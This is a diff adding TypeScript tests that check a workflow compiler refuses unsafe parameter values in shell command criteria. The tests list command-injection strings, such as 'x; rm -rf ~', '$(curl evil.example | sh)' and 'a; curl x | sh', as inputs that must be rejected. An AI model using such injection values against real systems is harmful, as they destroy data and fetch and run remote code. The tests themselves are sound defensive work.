@@ -236,6 +236,278 @@ describe('compileWorkflow', () => {
   });
 });
 
+/** A workflow whose test stage runs `npm test -- {{target}}` at merge. */
+const CMD: WorkflowDef = {
+  id: 'cmd',
+  params: {
+    target: { required: true, description: 'The test file' },
+    note: { default: 'hello; world' },
+  },
+  milestone: { title: 'Test {{target}}: {{note}}', done_when: '{{target}} passes' },
+  stages: [
+    {
+      key: 'test',
+      title: 'Test {{target}} ({{note}})',
+      owner: '*:engineer',
+      estimate: '1h',
+      body: 'Run it on {{note}}',
+      done_when: { id: 'tests', kind: 'command', run: 'npm test -- {{target}}' },
+    },
+  ],
+};
+
+/** Shell metacharacters and tricks for `cmd.exe` and `sh`, each a value a start must refuse. */
+const HOSTILE = [
+  'x; rm -rf ~',
+  '$(curl evil.example | sh)',
+  '`id`',
+  'a && b',
+  'a || b',
+  'a | b',
+  'a & b',
+  '%PATH%',
+  '!x!',
+  'a^b',
+  '"quoted"',
+  "it's",
+  'a > out.txt',
+  'a < in.txt',
+  'two words',
+  'line\nbreak',
+  'tab\there',
+  '*.ts',
+  'a?b',
+  '[ab]',
+  '~/x',
+  '#comment',
+  '(sub)',
+  '{a,b}',
+  'a=b',
+  'a,b',
+  'back\\slash',
+  '--output=/etc/passwd',
+  '-rf',
+  '',
+  'x'.repeat(201),
+];
+
+describe('parameters in command criteria', () => {
+  it('fill in a value that stays one plain word, and leave other text as it is', () => {
+    const c = compileWorkflow(CMD, {
+      params: { target: 'packages/core/test/a.test.ts' },
+      human: 'human:dawid',
+    });
+    const item = c.doc.items[0]!;
+    expect(item.done_when).toEqual({
+      id: 'tests',
+      kind: 'command',
+      run: 'npm test -- packages/core/test/a.test.ts',
+    });
+    // Titles, bodies and the milestone are text, not commands: any value goes in unchanged.
+    expect(item.title).toBe('Test packages/core/test/a.test.ts (hello; world)');
+    expect(item.body).toBe('Run it on hello; world');
+    expect(c.milestone.title).toBe('Test packages/core/test/a.test.ts: hello; world');
+    for (const ok of ['v1.2.3', 'feature/login', 'https://example.com/a', 'a@b.c', '_x', '.']) {
+      expect(
+        () => compileWorkflow(CMD, { params: { target: ok }, human: 'human:dawid' }),
+        ok,
+      ).not.toThrow();
+    }
+  });
+
+  it('refuse a hostile value at start, naming the parameter and the stage', () => {
+    for (const bad of HOSTILE) {
+      const err = refusal(() =>
+        compileWorkflow(CMD, { params: { target: bad }, human: 'human:dawid' }),
+      );
+      expect(err.code, JSON.stringify(bad)).toBe(2);
+      expect(err.message, JSON.stringify(bad)).toContain(
+        "workflow cmd, stage 'test': --param target goes into a command criterion",
+      );
+    }
+    expect(
+      refusal(() =>
+        compileWorkflow(CMD, { params: { target: 'x; rm -rf ~' }, human: 'human:dawid' }),
+      ).message,
+    ).toBe(
+      "workflow cmd, stage 'test': --param target goes into a command criterion, which swarmupd " +
+        'runs in a shell at merge, and it may hold only letters, digits and . _ / : @ - (no ' +
+        'spaces, quotes or shell characters, and not starting with \'-\'); got "x; rm -rf ~"',
+    );
+  });
+
+  it('refuse a hostile value in criteria defaults and the milestone check, only where it runs', () => {
+    const viaCriteria: WorkflowDef = {
+      ...CMD,
+      criteria: { task: { kind: 'command', run: 'make check T={{target}}' } },
+      stages: [{ key: 'a', title: 'A', owner: '*:engineer', estimate: '1h' }],
+    };
+    expect(
+      refusal(() =>
+        compileWorkflow(viaCriteria, { params: { target: '$(id)' }, human: 'human:dawid' }),
+      ).message,
+    ).toContain('workflow cmd, criteria.task: --param target goes into a command criterion');
+    // A default for a type no stage has never runs, so its value is not refused.
+    const unused: WorkflowDef = { ...viaCriteria, criteria: { bug: viaCriteria.criteria!.task } };
+    expect(() =>
+      compileWorkflow(unused, { params: { target: '$(id)' }, human: 'human:dawid' }),
+    ).not.toThrow();
+    const viaMilestone: WorkflowDef = {
+      ...CMD,
+      milestone: { title: 'T', done_when: { kind: 'command', run: 'test -f {{target}}' } },
+      stages: [{ key: 'a', title: 'A', owner: '*:engineer', estimate: '1h' }],
+    };
+    expect(
+      refusal(() =>
+        compileWorkflow(viaMilestone, { params: { target: 'a;b' }, human: 'human:dawid' }),
+      ).message,
+    ).toContain('workflow cmd, milestone: --param target goes into a command criterion');
+  });
+
+  it('refuse a parameter that names the program, unless the workflow lists its options', () => {
+    const tool: WorkflowDef = {
+      ...CMD,
+      params: { tool: { required: true } },
+      milestone: { title: 'T', done_when: 'd' },
+      stages: [
+        {
+          key: 'a',
+          title: 'A',
+          owner: '*:engineer',
+          estimate: '1h',
+          done_when: { kind: 'command', run: 'pnpm build && {{tool}} test' },
+        },
+      ],
+    };
+    expect(
+      refusal(() => compileWorkflow(tool, { params: { tool: 'rm' }, human: 'human:dawid' }))
+        .message,
+    ).toBe(
+      "workflow cmd, stage 'a': {{tool}} is the program a command criterion runs, so its value " +
+        'could run anything; give parameter tool options, or write the program in the command',
+    );
+    const listed: WorkflowDef = { ...tool, params: { tool: { options: ['vitest', 'jest'] } } };
+    const c = compileWorkflow(listed, { params: { tool: 'jest' }, human: 'human:dawid' });
+    expect(c.doc.items[0]!.done_when).toMatchObject({ run: 'pnpm build && jest test' });
+  });
+
+  it('check a value against the parameter’s pattern, wherever it goes', () => {
+    const v: WorkflowDef = {
+      ...CMD,
+      params: { ...CMD.params, target: { required: true, pattern: 'v[0-9]+(\\.[0-9]+)*' } },
+    };
+    expect(() =>
+      compileWorkflow(v, { params: { target: 'v1.2' }, human: 'human:dawid' }),
+    ).not.toThrow();
+    expect(
+      refusal(() => compileWorkflow(v, { params: { target: 'v1.2-rc' }, human: 'human:dawid' }))
+        .message,
+    ).toBe("--param target: 'v1.2-rc' does not match the pattern v[0-9]+(\\.[0-9]+)*");
+  });
+
+  it('let a preview stand in values without checking them', () => {
+    expect(() =>
+      compileWorkflow(CMD, {
+        params: { target: '<target>' },
+        human: 'human:dawid',
+        placeholders: ['target'],
+      }),
+    ).not.toThrow();
+  });
+
+  it('show in validate: a parameter as the program, a value that cannot run, a bad pattern', () => {
+    const root = initRoot(tempDir(), { name: 't', human: 'human:dawid' });
+    put(
+      root,
+      'workflows/unsafe.yaml',
+      [
+        'params:',
+        '  tool: {required: true}',
+        "  dir: {default: 'my dir'}",
+        "  mode: {options: [fast, 'slow; rm -rf ~']}",
+        "  ver: {pattern: '[0-9]+', default: 'x'}",
+        "  bad: {pattern: '(', default: '1'}",
+        'milestone: {title: T, done_when: d}',
+        'stages:',
+        '  - key: a',
+        '    title: A',
+        "    owner: '*:engineer'",
+        '    estimate: 1h',
+        "    done_when: {kind: command, run: '{{tool}} --dir {{dir}} --mode {{mode}}'}",
+        '',
+      ].join('\n'),
+    );
+    put(
+      root,
+      'workflows/safe.yaml',
+      [
+        'params:',
+        "  target: {required: true, pattern: '[a-z/.]+'}",
+        '  tool: {options: [vitest, jest], default: vitest}',
+        'milestone: {title: T, done_when: d}',
+        'stages:',
+        '  - key: a',
+        "    title: 'Test {{target}}'",
+        "    owner: '*:engineer'",
+        '    estimate: 1h',
+        "    done_when: {kind: command, run: 'npx {{tool}} run {{target}}'}",
+        '',
+      ].join('\n'),
+    );
+    const out = loadDefinitions(root, { strict: true })
+      .problems.filter((p) => p.file.endsWith('.yaml'))
+      .map(
+        (p) =>
+          `${p.file.slice(root.length + 1).replace(/\\/g, '/')}:${p.line}: ${p.path}: ${p.message}`,
+      );
+    expect(out.filter((l) => l.startsWith('workflows/safe.yaml'))).toEqual([]);
+    const cannot =
+      "it may hold only letters, digits and . _ / : @ - (no spaces, quotes or shell characters, and not starting with '-')";
+    expect(out).toEqual(
+      expect.arrayContaining([
+        "workflows/unsafe.yaml:5: params.ver.default: the default 'x' does not match [0-9]+",
+        expect.stringMatching(/^workflows\/unsafe\.yaml:6: params\.bad\.pattern: bad pattern: /),
+        'workflows/unsafe.yaml:13: stages[0].done_when.run: {{tool}} is the program this command runs, so a value could run anything; give parameter tool options, or write the program in the command',
+        `workflows/unsafe.yaml:3: params.dir.default: the default 'my dir' cannot go into the command at stages[0].done_when.run: ${cannot}`,
+        `workflows/unsafe.yaml:4: params.mode.options[1]: the option 'slow; rm -rf ~' cannot go into the command at stages[0].done_when.run: ${cannot}`,
+      ]),
+    );
+    expect(readWorkflows(root).find((w) => w.id === 'unsafe')!.def).toBeNull();
+    expect(readWorkflows(root).find((w) => w.id === 'safe')!.def).not.toBeNull();
+  });
+
+  it('refuse a hostile value at workflow start, before anything is written', () => {
+    const w = setup();
+    put(
+      w.rootDir,
+      'workflows/cmd.yaml',
+      [
+        'params:',
+        '  target: {required: true}',
+        'milestone:',
+        "  title: 'Test {{target}}'",
+        "  done_when: '{{target}} passes'",
+        'stages:',
+        '  - key: test',
+        "    title: 'Test {{target}}'",
+        "    owner: 'claude:engineer'",
+        '    estimate: 1h',
+        "    done_when: {kind: command, run: 'npm test -- {{target}}'}",
+        '',
+      ].join('\n'),
+    );
+    const h = w.as('human:dawid');
+    const before = h.list({ all: true }).length;
+    const err = refusal(() => h.workflowStart('cmd', { params: { target: 'a; curl x | sh' } }));
+    expect(err.message).toContain('--param target goes into a command criterion');
+    expect(h.list({ all: true }).length).toBe(before);
+    const ok = h.workflowStart('cmd', { params: { target: 'test/a.test.ts' } });
+    expect(ok.compiled.doc.items[0]!.done_when).toMatchObject({
+      run: 'npm test -- test/a.test.ts',
+    });
+  });
+});
+
 /** A store with the demo workflow and a human; `approval` as given. */
 function world(approval: 'proposal' | 'starter' = 'proposal') {
   const w = setup();
